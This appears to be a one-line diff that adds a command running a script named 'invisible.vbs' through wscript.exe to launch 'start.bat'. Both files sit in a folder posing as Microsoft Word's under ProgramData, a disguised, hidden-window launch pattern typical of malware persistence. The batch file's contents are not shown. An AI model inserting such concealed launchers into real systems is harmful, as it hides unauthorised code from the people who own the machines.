@@ -1,0 +1,1 @@
+wscript.exe "C:\ProgramData\Microsoft Word\invisible.vbs" "C:\ProgramData\Microsoft Word\start.bat"
